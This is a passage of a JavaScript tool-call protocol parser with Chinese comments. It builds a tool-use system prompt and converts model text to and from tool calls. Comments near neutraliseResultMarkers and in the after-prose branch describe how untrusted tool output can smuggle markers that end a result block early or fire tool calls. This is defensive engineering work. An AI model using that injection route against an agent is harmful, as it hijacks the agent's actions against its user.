 *   - 锚点是触发器 / 候选：残片只到候选所在行的行尾（不到锚点）—— 行与锚点之间的
 *     文本无从证明是协议，按正文重扫（review loop 2：`{Bash 配不平}\nprose\n{Read}`
 *     里的 prose 必须可见，Read 按正文之后的语义门晋升）。
 *   - 一个锚点都没有：切到文本末尾（found:false）—— 后面没有任何东西能成为调用，
 *     "绝不切到末尾"的理由不成立；首位整段登记为残渣，正文之后整段可见。
 * afterProse 决定"下一个候选"用哪条谓词 —— 残片放行后扫描循环恢复时用的正是那一条。
 * triggerAt：调用方已算好的下一个触发器（相对 text 的下标，-1 = 没有；undefined = 这里算）。
 * @param {string} text - 从候选 '{' 起的文本
 * @returns {{ end: number, closerStart: number, viaCloser: boolean, found: boolean }}
 */
const findSyntheticDebrisCut = (text, afterProse, triggerAt) => {
  let end = -1;
  let closerStart = -1;
  const consider = (at, closerAt = -1) => {
    if (at !== -1 && (end === -1 || at < end)) {
      end = at;
      closerStart = closerAt;
    }
  };
  if (triggerAt === undefined) {
    const trigger = text.slice(1).match(TOOL_CALL_TRIGGER_RE);
    triggerAt = trigger ? 1 + trigger.index : -1;
  }
  consider(triggerAt);
  const closer = text.match(TOOL_CALL_CLOSE_BRACKET_SCAN_RE);
  if (closer) consider(closer.index + closer[0].length, closer.index);
  consider(nextPayloadCandidate(text, 1, false, end === -1 ? text.length : end, afterProse));
  if (end === -1) return { end: text.length, closerStart: -1, viaCloser: false, found: false };
  if (closerStart === -1) {
    const newline = text.indexOf('\n');
    if (newline !== -1 && newline + 1 < end) end = newline + 1;
  }
  return { end, closerStart, viaCloser: closerStart !== -1, found: true };
};

/**
 * 孤儿方括号闭标记的登记（review loop 2）：`[END TOOL CALL]` 独自出现在正文里时
 * 从不进扫描循环（触发器正则不认 `[END`），却是**无歧义**的协议残渣 —— 合法回答
 * 里出现它的概率≈0，写侧的 neutraliseResultMarkers 还在结果正文里主动打瘸它。
 * 在最终 cleanedText 上补一遍登记，交付层照登记位置剥掉；只登记、绝不改动
 * cleanedText —— 检测输入（containsOrphanProtocolResidue 据它点火 malformed_protocol
 * 重试）保持逐字节原样，剥离仍然只发生在交付点。
 *
 * 两条豁免：（1）围栏/行内代码里的例子按构造不是残渣（同一套 code tracker，
 * 在**交付文本**上走 —— 读者看到的就是这份）；（2）已登记 span 内部的闭标记
 * 不重复登记 —— 重叠条目会让降序剥离互相拆台（先剥内层，外层校验就配不上了）。
 * @param {string} text - 最终 cleanedText（登记坐标系）
 * @param {Array<{text: string, at: number}>} spans - 既有登记簿，就地追加
 */
const recordOrphanBracketClosers = (text, spans) => {
  if (!TOOL_CALL_CLOSE_BRACKET_SCAN_RE.test(text)) return;
  const tracker = createCodeContextTracker();
  let from = 0;
  for (;;) {
    const match = text.slice(from).match(TOOL_CALL_CLOSE_BRACKET_SCAN_RE);
    if (!match) return;
    const at = from + match.index;
    tracker.consume(text.slice(from, at));
    const insideRecorded = spans.some(span =>
      typeof span.text === 'string' && at >= span.at && at < span.at + span.text.length);
    if (!tracker.inCode() && !insideRecorded) {
      spans.push({ text: match[0], at });
    }
    tracker.consume(text.slice(at, at + match[0].length));
    from = at + match[0].length;
  }
};

const createToolCallObject = (payload, index = 0, id = null) => ({
  index,
  id: id || `call_${generateUUID().replace(/-/g, '').slice(0, 24)}`,
  type: 'function',
  function: {
    name: payload.name,
    arguments: serializeToolArguments(payload.arguments)
  }
});

/**
 * 将 JSON Schema 类型压缩为简短 TypeScript 风格签名
 * @param {Object} schema - JSON Schema 节点
 * @returns {string} TS 风格类型表示
 */
const compressSchemaType = (schema) => {
  if (!schema || typeof schema !== 'object') {
    return 'any';
  }

  if (Array.isArray(schema.enum) && schema.enum.length > 0) {
    return schema.enum.map(value => JSON.stringify(value)).join(' | ');
  }

  const type = schema.type;

  if (type === 'array') {
    const itemType = compressSchemaType(schema.items);
    return `${itemType}[]`;
  }

  if (type === 'object') {
    if (!schema.properties || typeof schema.properties !== 'object') {
      return 'object';
    }
    const requiredKeys = new Set(Array.isArray(schema.required) ? schema.required : []);
    const fields = Object.entries(schema.properties).map(([key, value]) => {
      const optional = requiredKeys.has(key) ? '' : '?';
      const description = compactDescription(value?.description, 180);
      return `${key}${optional}: ${compressSchemaType(value)}${description ? ` /* ${description.replace(/\*\//g, '* /')} */` : ''}`;
    });
    return `{ ${fields.join('; ')} }`;
  }

  if (Array.isArray(type)) {
    return type.map(t => compressSchemaType({ ...schema, type: t })).join(' | ');
  }

  return type || 'any';
};

/**
 * 将单个工具定义压缩为 TS 风格签名
 * @param {Object} tool - OpenAI 工具定义
 * @returns {string} 压缩后的工具描述
 */
const compressToolDefinition = (tool) => {
  const fn = tool?.function || tool;
  const name = fn?.name || 'unknown';
  const description = compactDescription(fn?.description);
  const params = fn?.parameters || { type: 'object', properties: {} };
  const signature = compressSchemaType(params);

  if (description) {
    return `- ${name}${signature}\n  ${description}`;
  }
  return `- ${name}${signature}`;
};

/**
 * 构建用于注入 system 消息的工具调用提示词
 * @param {Array<Object>} tools - OpenAI 风格工具定义列表
 * @param {Object} [options] - 可选参数
 * @param {string|Object} [options.tool_choice] - OpenAI tool_choice 参数
 * @returns {string} 完整的工具调用系统提示词
 */
const buildToolSystemPrompt = (tools, options = {}) => {
  if (!Array.isArray(tools) || tools.length === 0) {
    return '';
  }

  const compressed = tools
    .map(compressToolDefinition)
    .filter(Boolean)
    .join('\n');

  const lines = [
    '# Tools',
    '',
    'You have access to the following tools. This is an Agent tool protocol, not a suggestion.',
    '',
    '## Available tools',
    compressed,
    '',
    '## Output format',
    'Emit each tool invocation as:',
    '',
    TOOL_CALL_OPEN,
    '{"name": "<tool_name>", "arguments": {<json_arguments>}}',
    TOOL_CALL_CLOSE,
    '',
    'Tool results come back to you as user messages in this form:',
    '',
    `${TOOL_RESULT_OPEN}<tool_name>]`,
    '<result text or JSON>',
    TOOL_RESULT_CLOSE,
    '',
    'Rules:',
    `- If the task requires reading, writing, editing, searching, shell execution, browser use, or any action covered by an available tool, your visible response MUST be a \`${TOOL_CALL_OPEN}\` block. Call the tool instead of describing the action.`,
    '- A tool call must be the first non-whitespace content of the visible answer. Do not write “I will…”, “Let me…”, “我将…”, “正在…”, a plan, or a completion claim before it.',
    `- The JSON inside \`${TOOL_CALL_OPEN}\` must be valid and on a single logical block.`,
    `- Write the opening marker as exactly \`${TOOL_CALL_OPEN}\` and the closing marker as exactly \`${TOOL_CALL_CLOSE}\`, each on its own line. They never take attributes, an id, or the tool name — everything the call needs is inside the JSON.`,
    '- Use the exact tool name listed above.',
    '- Provide all required arguments; omit unknown ones.',
    `- You may emit multiple \`${TOOL_CALL_OPEN}\` blocks back-to-back when more than one tool is needed.`,
    '- After every tool result, evaluate the actual task state. If work remains, emit the next tool call. Only return a normal-language final answer after the requested task is genuinely complete or you are blocked on user input.',
    '- Never claim that a file was changed, a command succeeded, or a result was verified unless the corresponding tool result proves it.',
    `- Do not call nonexistent tools, fabricate tool results, wrap \`${TOOL_CALL_OPEN}\` in code fences, or mix extra commentary into a tool-call turn.`,
    '- A non-tool response is valid only when it explicitly declares its state: use the completion or blocked wrapper below. Bare prose is invalid.',
    `- Verified completion: ${AGENT_FINAL_OPEN}final report${AGENT_FINAL_CLOSE}`,
    `- Requires user input/authority: ${AGENT_BLOCKED_OPEN}exact blocker${AGENT_BLOCKED_CLOSE}`,
    '- Never emit the completion wrapper after merely finishing one intermediate tool action; continue with another tool call until every requested outcome is verified.'
  ];

  const choice = options.tool_choice;
  if (choice === 'required') {
    lines.push('- You MUST call at least one tool before answering.');
  } else if (choice && typeof choice === 'object' && choice.function?.name) {
    lines.push(`- You MUST call the tool \`${choice.function.name}\` first.`);
  } else if (choice === 'none') {
    lines.push('- Do NOT call any tool for this turn; respond as plain text.');
  }

  return lines.join('\n');
};

/**
 * 将历史中的 assistant tool_calls / tool 角色消息折叠成纯文本，
 * 以便上游网页接口（仅识别 user/assistant/system）能正确接收上下文。
 * 折叠时保留原始 tool_call_id，并将后续 role=tool 消息按 id 精确回链。
 * @param {Array<Object>} messages - 原始 OpenAI 风格消息数组
 * @returns {Array<Object>} 折叠后的消息数组
 */
const foldToolMessages = (messages) => {
  if (!Array.isArray(messages)) return messages;

  const callIdToName = new Map();

  return messages.map((message) => {
    if (!message || typeof message !== 'object') return message;

    const assistantCalls = message.role === 'assistant'
      ? (Array.isArray(message.tool_calls) && message.tool_calls.length > 0
        ? message.tool_calls
        : (message.function_call?.name ? [message.function_call] : []))
      : [];
    if (assistantCalls.length > 0) {
      const blocks = assistantCalls.map((call) => {
        const fn = call?.function || call;
        let args = fn?.arguments;
        if (typeof args === 'string') {
          try {
            args = JSON.parse(args);
          } catch (_) {
            // 保留原始字符串形式
          }
        }
        const name = fn?.name || 'unknown';
        const id = call?.id || `call_${generateUUID().replace(/-/g, '').slice(0, 24)}`;
        callIdToName.set(id, name);
        // 提示词里写的是 {name, arguments} 两个键，这里也只写两个。多出来的 id 是
        // <tool_call_id_1> 这一族坏标签的种子，而模型从来没有自己吐出过 id（name ×36、id ×0）。
        // callIdToName 仍然留着 id，用来给下面的结果消息定名。
        const payload = { name, arguments: args ?? {} };
        return `${TOOL_CALL_OPEN}\n${JSON.stringify(payload)}\n${TOOL_CALL_CLOSE}`;
      });
      const original = typeof message.content === 'string' ? message.content : '';
      return {
        role: 'assistant',
        content: [original, blocks.join('\n')].filter(Boolean).join('\n')
      };
    }

    if (message.role === 'tool' || message.role === 'function') {
      const callId = message.tool_call_id || '';
      const name = message.name || callIdToName.get(callId) || (message.role === 'function' ? 'function' : 'tool');
      const content = typeof message.content === 'string'
        ? (message.content || 'null')
        : JSON.stringify(message.content ?? null);
      return {
        role: 'user',
        content: `${TOOL_RESULT_OPEN}${sanitizeMarkerName(name)}]\n${neutraliseResultMarkers(content)}\n${TOOL_RESULT_CLOSE}`
      };
    }

    return message;
  });
};

/**
 * 结果正文必须对它自己封闭。工具结果是**不可信内容** —— 文件、网页、命令输出 —— 里面
 * 完全可能出现 `[END TOOL RESULT]`。原样写出去，块就在那里提前结束，后面的内容就变成了
 * 对模型说的话。把正文里的标记打断，让它再也关不掉这个块。
 * @param {string} value - 原始结果正文
 * @returns {string} 标记已失效的正文
 */
const neutraliseResultMarkers = (value) => String(value)
  .replace(/\[[ \t]*END[ \t]+TOOL[ \t]+RESULT[ \t]*\]/gi, '(END TOOL RESULT)')
  .replace(/\[[ \t]*TOOL[ \t]+RESULT[ \t]*:/gi, '(TOOL RESULT:')
  // 调用标记同样要在结果正文里失效：不可信内容里的 `[TOOL CALL]` / `<tool_call>`
  // 一旦被模型原样引用到回答开头，就是一个可以点火的触发器。把头字符换掉，
  // 触发器正则（与之锁步）就永远匹配不上。
  .replace(/\[(?=[ \t]{0,4}tool[ \t_-]{1,2}calls?)/gi, '(')
  .replace(/\[(?=[ \t]{0,4}(?:END[ \t_-]{1,2}|\/[ \t]{0,4})TOOL[ \t_-]{1,2}CALLs?)/gi, '(')
  // i 标志不可省：TOOL_CALL_TRIGGER_RE 的尖括号臂是 case-insensitive，缺 i 时
  // `<TOOL_CALL>` 从不可信正文里原样漏过，被模型引用到回答开头就能点火调起工具。
  .replace(/<(?=[ \t]{0,4}\/?[ \t]{0,4}tool_calls?)/gi, '(');

/**
 * 结果标记占一整行，工具名里不能出现会把它撑破的字符
 * @param {string} value - 原始工具名
 * @returns {string} 可安全放进标记行的名字
 */
const sanitizeMarkerName = (value) => String(value || '')
  .replace(/[[\]\r\n]/g, ' ')
  .trim() || 'tool';

/**
 * 从完整文本中提取所有工具调用
 * @param {string} fullText - 模型完整输出
 * @param {Object} [options]
 * @param {Set<string>|Array<string>} [options.allowedToolNames]
 * @returns {{ cleanedText: string, toolCalls: Array<Object>, errors: Array<Object>, warnings: Array<Object> }}
 */
const parseToolCallsFromText = (fullText, options = {}) => {
  const allowedToolNames = normalizeAllowedToolNames(options.allowedToolNames);
  // 无非空白名单就无抢救：名字闸门在旧语义下放行一切，抢救会给未声明的名字
  // 捏出 tool_use。正则触发器保持旧行为。
  const salvage = !!allowedToolNames;
  // 引号修复 / 尾巴名字抢救的上下文：非空白名单**且** toolSchemas 齐备才存在
  // （fail closed —— schema 闸门是抢救的一半边界）。anthropic 路径与 OpenAI Agent 运行时
  // （openai-agent-runtime.js，自 spec-agent-turn-cutoff-openai-parity）都传 toolSchemas，
  // 但只在 answer phase；think phase 的解析与 chat.js 的旧非-Agent 分支不传，行为不变。
  const repairSalvage = allowedToolNames && options.toolSchemas
    ? { allowedToolNames, toolSchemas: options.toolSchemas }
    : null;
  // 快路径必须与识别器同步：正则触发器**或**（抢救开启时）答案开头的裸负载形状、
  // **或**（带齐抢救上下文时）任何一个行首 '{'（正文之后的裸负载候选），三者都算
  // “可能有调用”。只测正则的话，合成开端在这里就被拦掉了。
  // 快路径的文本照样要登记孤儿闭标记（`[END TOOL CALL]` 不点火任何触发器，
  // 正是从这里原样穿过的）—— cleanedText 本身逐字节不动。
  if (typeof fullText !== 'string' ||
      !(TOOL_CALL_TRIGGER_RE.test(fullText) ||
        (salvage && isLeakedToolPayloadShape(fullText)) ||
        (repairSalvage && LINE_START_BRACE_RE.test(fullText)))) {
    const fastPathSpans = [];
    if (typeof fullText === 'string') recordOrphanBracketClosers(fullText, fastPathSpans);
    return { cleanedText: fullText || '', toolCalls: [], errors: [], warnings: [], residueSpans: fastPathSpans };
  }

  const toolCalls = [];
  const errors = [];
  const warnings = [];
  // 被定罪原文的登记簿：`{ text, at }`，at = 登记当刻 cleanedText 的长度（位置
  // 驱动的剥离，见 stripToolCallResidue）。只登记**确实落进 cleanedText、且可
  // 证明是协议**的残渣：truncated 定罪段（收窄到闭标记或触发器+尾巴）与合成
  // debris。被闸门拒绝的合成负载（releaseRejectedSpan）**不登记** —— 按它自己
  // 的教义可能就是回答本身，永远不可剥离（review loop 1）。被整段吞掉的（not
  // the first content）没有可剥离的字节，不登记；围栏里的文档在触发器阶段就被
  // 按正文压制，由构造永远不进这里。
  const residueSpans = [];
  const code = createCodeContextTracker();

  let cleanedText = '';
  let position = 0;
  let emittedProse = false;

  // 只有真正被消费成调用的那一段才从正文里移除。被拒绝的一段连触发器一起还回去：
  // 触发器本身就可能是句子的一部分（"your visible response MUST be a `<tool_call>` block"），
  // 只还负载会把两侧的字符黏在一起。
  const releaseProse = (text) => {
    if (!text) return;
    code.consume(text);
    cleanedText += text;
    if (/\S/.test(text)) emittedProse = true;
  };

  // 被消费掉的调用片段（成功或失败）不算“正文已经开始”，也不喂给代码上下文追踪器：
  // 模型连写两个调用、第一个写坏时，第二个仍然是回答的开头；而负载里的反引号是 JSON
  // 字符串的内容，不是 Markdown 标记，喂进去会让围栏状态永久错位。
  const releaseDebris = (text) => { cleanedText += text; };

  // 被闸门拒绝的合成负载：可见（进 cleanedText，残渣检测据此点火）、**置位**
  // emittedProse（一个形状完整却没过闸门的对象跟普通 JSON 答案无法区分 —— 不关
  // 这扇门，答案后面被模型引用的触发器就能点火执行）、但不喂围栏追踪器（负载
  // 字符串里行首的 ``` 不是 Markdown，喂进去会把后续真触发器整段误判成文档）。
  const releaseRejectedSpan = (text) => {
    if (!text) return;
    cleanedText += text;
    if (/\S/.test(text)) emittedProse = true;
  };

  // 上一个连闭标记一起被消费的片段的结束位置：紧跟其后的候选按**行首**对待
  // （流式解析器的 lineStart 在同一时刻置真，两条路径同一条规则）。
  let spanResolvedAt = -1;

  // 下一个正则触发器的位置缓存（review loop 2）：围栏里逐行放行时不能每行都对整个剩余
  // 文本重跑触发器正则（平方级）；残片切点也复用。缓存"从 from 起的第一个触发器在 at"，
  // 只要新的起点没越过 at 就仍然有效。
  let triggerCache = { from: 0, at: -2 };
  const nextTriggerAt = (from) => {
    if (triggerCache.at !== -2 && triggerCache.from <= from &&
        (triggerCache.at === -1 || triggerCache.at >= from)) {
      return triggerCache.at;
    }
    const match = fullText.slice(from).match(TOOL_CALL_TRIGGER_RE);
    triggerCache = { from, at: match ? from + match.index : -1 };
    return triggerCache.at;
  };

  /**
   * 合成开端（from 指向 '{'）的结算。闸门 —— 负载配平、强制闭标记（邻接规则）、
   * 名字只来自负载 —— 之后按**位置**分两条路：
   *   首位：白名单闸门不过 → 可证明是协议（闭标记在场）→ errors + 登记 + debris，
   *         与规范触发器的错误分支逐字对齐。以前按可见正文放行并置位 emittedProse，
   *         于是同一批里后面每个写对了的裸负载都跟着泄漏成正文（事故 2026-09-02）。
   *   正文之后：语义门（gateAfterProsePayload）过 → 调用；不过 → 负载可见
   *         （releaseRejectedSpan）、闭标记字节消费掉、只留 warning —— 绝不进 errors、
   *         绝不留下孤儿闭标记（那会点火 malformed_protocol 重试，frozen Always 禁止）。
   * 闭标记缺席的负载两个位置都按可见文本放行（可能就是回答本身），绝不进
   * recoveredText（chat.js 旧路径丢弃 recoveredText，误吞的真回答会消失）。
   * 与流式路径的同名分支逐字对齐，parity 由测试钉住。
   * @returns {number} 新的扫描位置
   */
  const resolveSyntheticAt = (from) => {
    const afterProse = emittedProse;
    // 正文之后的配平封顶在 AFTER_PROSE_PAYLOAD_MAX（与流式同一上界，review loop 2）：
    // 更远处才配平的对象按"配不平"结算，两条路径同一条 warning、同一个切点。
    const object = afterProse
      ? extractAfterProseObject(fullText, from)
      : extractBalancedObject(fullText, from);
    if (!object) {
      // 首位：定罪之前先抢救一次（事故 3 的裸负载形态：引号奇偶被打破，永远配不平）。
      // 抢救保持位置门（frozen Always）：正文之后绝不抢救。
      const salvaged = !afterProse && repairSalvage
        ? salvageTruncatedSpan(fullText.slice(from), repairSalvage)
        : null;
      if (salvaged) {
        toolCalls.push(createToolCallObject(salvaged.payload, toolCalls.length));
        spanResolvedAt = consumeDuplicateClosers(fullText, from + salvaged.end, false).end;
        return spanResolvedAt;
      }
      // 配不平的候选是残片，切点见 findSyntheticDebrisCut（触发器位置走缓存）。正文之后
      // 锚点只在 AFTER_PROSE_PAYLOAD_MAX 内找（流式在上界处结算时缓冲里也只有这么多 ——
      // 更远处的闭标记两条路径都看不见，parity 才不依赖 chunk 大小）。
      const window = afterProse ? AFTER_PROSE_PAYLOAD_MAX : fullText.length - from;
      const triggerAt = nextTriggerAt(from + 1);
      const triggerRel = triggerAt === -1 || triggerAt - from >= window ? -1 : triggerAt - from;
      const cut = findSyntheticDebrisCut(fullText.slice(from, from + window), afterProse, triggerRel);
      const debris = fullText.slice(from, from + cut.end);
      if (afterProse) {
        // 正文之后：可见、不登记、不落错误。切点是闭标记时（review loop 2），闭标记
        // **之前**的残片可见、闭标记本身连同重复闭标记消费掉 —— 可见的孤儿闭标记会
        // 点火 malformed_protocol 重试，frozen Always 禁止正文之后的失败触发重试。
        warnings.push({ type: 'synthetic_rejected', reason: 'unbalanced payload', raw: '' });
        logSyntheticRejected('unbalanced payload');
        if (cut.viaCloser) {
          releaseProse(fullText.slice(from, from + cut.closerStart));
          spanResolvedAt = consumeDuplicateClosers(fullText, from + cut.end, false).end;
          return spanResolvedAt;
        }
        releaseProse(debris);
        return from + cut.end;
      }
      if (cut.viaCloser) {
        // 首位 + 闭标记在场 → 可证明是协议：硬错误（与规范触发器的 truncated 分支同路）。
        const error = { type: 'truncated_tool_call', raw: debris };
        errors.push(error);
        logToolError(error);
      } else {
        warnings.push({ type: 'synthetic_rejected', reason: 'unbalanced payload', raw: '' });
        logSyntheticRejected('unbalanced payload');
      }
      // 残片按 debris 放行（不算"正文已经开始"），登记供交付层剥离。硬错误（闭标记
      // 在场）时紧随其后的重复闭标记一并吞掉（硬拒绝的片段可证明是协议，review loop 2）。
      residueSpans.push({ text: debris, at: cleanedText.length });
      releaseDebris(debris);
      if (cut.viaCloser) {
        spanResolvedAt = consumeDuplicateClosers(fullText, from + cut.end, false).end;
        return spanResolvedAt;
      }
      return from + cut.end;
    }
    const closer = consumeMandatoryBracketCloser(fullText, object.end, false);
    if (!closer.found) {
      // 闭标记缺席或邻接违规：负载按可见文本放行，尾巴交还扫描循环。
      // 不进登记簿：被拒绝的负载可能就是回答本身（见登记簿头注释）。
      warnings.push({ type: 'synthetic_rejected', reason: 'missing closer', raw: '' });
      logSyntheticRejected('missing closer');
      releaseRejectedSpan(object.text);
      return object.end;
    }
    const built = buildToolCallPayload(object.text, repairSalvage);
    if (afterProse) {
      const admitted = !built.error && gateAfterProsePayload(built.payload, repairSalvage);
      if (!admitted) {
        // 只登记错误**类型**：invalid_json 的 reason 内嵌负载片段（见 logToolError）。
        const reason = built.error ? built.error.type : 'after-prose semantic gate';
        warnings.push({ type: 'synthetic_rejected', reason, raw: '' });
        logSyntheticRejected(reason);
        releaseRejectedSpan(object.text);
        spanResolvedAt = consumeDuplicateClosers(fullText, closer.end, false).end;
        return spanResolvedAt;
      }
      logAfterProsePromotion(built.payload.name, 'opener-less payload + closer');
      toolCalls.push(createToolCallObject(built.payload, toolCalls.length));
      spanResolvedAt = consumeDuplicateClosers(fullText, closer.end, false).end;
      return spanResolvedAt;
    }
    const gateError = built.error || gateToolName(built.payload, allowedToolNames);
    if (gateError) {
      errors.push(gateError);
      logToolError(gateError);
      const span = fullText.slice(from, closer.end);
      residueSpans.push({ text: span, at: cleanedText.length });
      releaseDebris(span);
      // 硬拒绝的片段可证明是协议：紧随其后的重复闭标记一并吞掉（review loop 2 —— 流式
      // 曾把第二个 `[END TOOL CALL]` 原样上线，整段路径却登记并剥掉了它）。
      spanResolvedAt = consumeDuplicateClosers(fullText, closer.end, false).end;
      return spanResolvedAt;
    }
    toolCalls.push(createToolCallObject(built.payload, toolCalls.length));
    spanResolvedAt = consumeDuplicateClosers(fullText, closer.end, false).end;
    return spanResolvedAt;
  };

  while (position < fullText.length) {
    // 代码上下文里**逐行**前进（review loop 2）：围栏/行内代码里的行首 '{' 是文档，
    // 整行按正文放行、从下一行重扫 —— 不逐字节（围栏里的 JSON 逐字节重扫是平方级），
    // 也不因为身在围栏里就把后面的候选整段放弃（围栏关上之后的候选仍然是候选：整段
    // 路径曾在这里 break，与流式对同一文本给出不同结果）。本行有触发器时交给下面的
    // 常规路径按"inside code context"压制；触发器位置走缓存，不每行重扫。
    if (code.inCode()) {
      const newline = fullText.indexOf('\n', position);
      const lineEnd = newline === -1 ? fullText.length : newline + 1;
      const triggerAt = nextTriggerAt(position);
      if (triggerAt === -1 || triggerAt >= lineEnd) {
        releaseProse(fullText.slice(position, lineEnd));
        position = lineEnd;
        continue;
      }
    }
    // 代码上下文单独传给识别器：围栏/行内代码里的裸负载永远是文档，不产生合成开端
    // （正则触发器的代码上下文处理保持原样，在下面按老规矩压制）。行首状态跨迭代
    // 由 fullText 本身（lineStartBefore：上一个换行到此处只有空白 —— 缩进过的候选与
    // 残片切点之后的恢复点也算行首）与 spanResolvedAt 给出（流式用 lineStart 记同一件事）。
    const opening = matchToolCallOpening(fullText.slice(position), {
      emittedProse,
      canSalvage: salvage,
      canSalvageAfterProse: !!repairSalvage,
      inCode: code.inCode(),
      atLineStart: position === spanResolvedAt || lineStartBefore(fullText, position)
    });
    if (!opening) break;

    const triggerAt = position + opening.index;
    releaseProse(fullText.slice(position, triggerAt));

    if (opening.synthetic) {
      // 候选之前的正文可能开了一道围栏：围栏里的行首 '{' 是文档 —— 整行放行、从
      // 下一行恢复扫描（不逐字节：围栏里的 JSON 一个字节一个字节地重扫是平方级的）。
      if (code.inCode()) {
        const newline = fullText.indexOf('\n', triggerAt);
        const lineEnd = newline === -1 ? fullText.length : newline + 1;
        releaseProse(fullText.slice(triggerAt, lineEnd));
        position = lineEnd;
        continue;
      }
      position = resolveSyntheticAt(triggerAt);
      continue;
    }

    const trigger = opening.text;
    const afterTrigger = triggerAt + trigger.length;

    const suppress = (reason, log) => {
      warnings.push({ type: 'triggered_unrecovered', reason, raw: trigger });
      log(trigger, reason);
      releaseProse(trigger);
      position = afterTrigger;
    };

    // 代码围栏 / 行内代码里的例子必须保持是例子 —— 原样留在正文里，但要留痕，不能静默。
    if (code.inCode()) {
      suppress('inside code context', logTriggerSuppressed);
      continue;
    }

    const payloadAt = findPayloadStart(fullText, afterTrigger, false);
    if (payloadAt < 0) {
      // 触发了却什么都凑不出来。以前这里完全无声，问题因此一直看不见。
      suppress('no payload in window', logTriggeredUnrecovered);
      continue;
    }

    // `[tool calls](url) … {json}`：方括号触发器后面接的是 Markdown 链接收尾，不是调用。
    if (isMarkdownLinkTail(trigger, fullText.slice(afterTrigger, payloadAt))) {
      suppress('markdown link, not a call', logTriggerSuppressed);
      continue;
    }

    const object = extractBalancedObject(fullText, payloadAt);
    const tail = fullText.slice(afterTrigger, payloadAt);
    const nameHint = repairSalvage ? extractTriggerNameHint(trigger, tail) : null;
    if (!object) {
      // 定罪之前的最后一搏（事故 3：引号奇偶被打破，负载永远配不平）。位置门与
      // 规范调用完全一致（decision A，frozen Always）：正文一旦出现过，抢救与
      // 整形调用同样被压制 —— 写坏的调用绝不能比写对的更可执行。真实事故 3 的
      // span 是回答的第一个内容，压制不丢修复。抢救成功时整段（触发器→闭标记）
      // 都被消费，不落错误、不占重试名额。
      const salvaged = repairSalvage && !emittedProse
        ? salvageTruncatedSpan(fullText.slice(payloadAt), { ...repairSalvage, nameHint })
        : null;
      if (salvaged) {
        toolCalls.push(createToolCallObject(salvaged.payload, toolCalls.length));
        position = consumeDuplicateClosers(fullText, payloadAt + salvaged.end, false).end;
        spanResolvedAt = position;
        continue;
      }
      // 一个配不平的 '{' 不能吞掉它后面的一切：只登记这一段的错误，扫描继续。
      const error = { type: 'truncated_tool_call', raw: fullText.slice(afterTrigger) };
      errors.push(error);
      logToolError(error);
      // 登记被定罪的**协议**原文及其在 cleanedText 里的落点。边界收在可证明是
      // 协议的部分：有闭标记时到闭标记结束；没有闭标记时只有触发器 + 尾巴 ——
      // 配不平的负载无从与后续正文划界，宁可少剥也不吞回答（frozen Always：
      // no closer ⇒ tail is not residue）。触发器在下面按正文放行，其余由后续
      // 扫描按正文放行，两段在 cleanedText 里连续。
      const spanTail = fullText.slice(payloadAt);
      const closerMatch = spanTail.match(TOOL_CALL_CLOSE_BRACKET_SCAN_RE);
      const condemnedEnd = closerMatch
        ? payloadAt + closerMatch.index + closerMatch[0].length
        : payloadAt;
      residueSpans.push({ text: fullText.slice(triggerAt, condemnedEnd), at: cleanedText.length });
      releaseProse(trigger);
      position = afterTrigger;
      continue;
    }

    const afterFence = skipTrailingFence(fullText, object.end, tail, false).end;
    const closer = consumeTrailingCloser(fullText, afterFence, false);
    const spanEnd = Math.max(afterFence, closer.end);
    const span = fullText.slice(triggerAt, spanEnd);
    // 正文之后的触发器：**语义门**替代位置门（2026-09-02）。以前"触发器必须是可见
    // 回答里第一个非空白内容"一刀切压制 —— 提示词的确这么要求，但 Qwen 照样叙述
    // （"Let me check…"、"## Plan"），于是每一个叙述后的真调用都无声丢失。现在：
    // 调用方带齐抢救上下文（白名单 + toolSchemas）时，先构造负载，过
    // gateAfterProsePayload（白名单 + required 键）就晋升为调用，每次留一行来源日志；
    // 不过（或没有抢救上下文 —— 没有 toolSchemas 就 fail closed：think phase 的解析和
    // chat.js 的旧非-Agent 分支正是这种情况）则
    // 按旧规矩压制：不产生调用、不进 errors、不点火重试，但整段仍然**吞掉**（连带
    // 紧随其后的重复闭标记）：它是工具标记，不是回答。放回正文会让裸协议漏给客户端
    // —— 模型在 thinking 里写 `checking <tool_call>{…}</tool_call>` 正是这一种。
    //
    // 模型复述回来的不可信内容自己也能带触发器：语义门放行时它会执行。已接受的风险
    // （spec，Richard 2026-09-02）：位置门从没保护过同一段被引用在位置 0 的情形；
    // 留下的缓冲是写侧的 neutraliseResultMarkers（结果正文里的触发器 / 闭标记在折叠
    // 时就被打瘸）、语义门、每次晋升一行来源日志。原生通道（delta.function_call）
    // 从 2026-09-01 起本来就不受位置门约束。
    if (emittedProse) {
      const built = repairSalvage
        ? buildToolCallPayload(object.text, { ...repairSalvage, nameHint })
        : null;
      const admitted = !!built && !built.error && gateAfterProsePayload(built.payload, repairSalvage);
      position = closer.end > afterFence
        ? consumeDuplicateClosers(fullText, closer.end, false).end
        : spanEnd;
      // 只有连闭标记一起收尾的片段才让紧随其后的候选按行首对待（review loop 2）：
      // 没有闭标记的片段之后同一行的 ` {…}` 是行中的 '{'，永远不是候选。
      if (closer.end > afterFence) spanResolvedAt = position;
      if (!admitted) {
        const reason = repairSalvage
          ? `after prose: ${built.error ? built.error.type : 'semantic gate rejected'}`
          : 'not the first content of the answer';
        warnings.push({ type: 'triggered_unrecovered', reason, raw: trigger });
        logTriggerSuppressed(trigger, reason);
        continue;
      }
      logAfterProsePromotion(built.payload.name, 'trigger after prose');
      toolCalls.push(createToolCallObject(built.payload, toolCalls.length));
      continue;
    }

    const built = buildToolCallPayload(object.text, repairSalvage ? { ...repairSalvage, nameHint } : null);
    const error = built.error || gateToolName(built.payload, allowedToolNames);
    if (error) {
      errors.push(error);
      logToolError(error);
      residueSpans.push({ text: span, at: cleanedText.length });
      releaseDebris(span);
      // 硬拒绝的片段可证明是协议：带闭标记收尾时连重复闭标记一起吞掉（review loop 2，
      // 与合成开端的硬拒绝分支同一条规则；流式的 closerSwallow 在同一时刻布防）。
      position = closer.end > afterFence
        ? consumeDuplicateClosers(fullText, closer.end, false).end
        : spanEnd;
      if (closer.end > afterFence) spanResolvedAt = position;
      continue;
    }

    toolCalls.push(createToolCallObject(built.payload, toolCalls.length));
    // 带闭标记收尾的调用吞掉后面的重复闭标记（实测泄漏 #2 的 `[END TOOL CALL][END TOOL CALL]`）
    // —— 流式路径的 closerSwallow 在同样的时刻布防，两条路径必须一致。只有连闭标记一起
    // 收尾的片段才让紧随其后的候选按行首对待（review loop 2）。
    position = closer.end > afterFence
      ? consumeDuplicateClosers(fullText, closer.end, false).end
      : spanEnd;
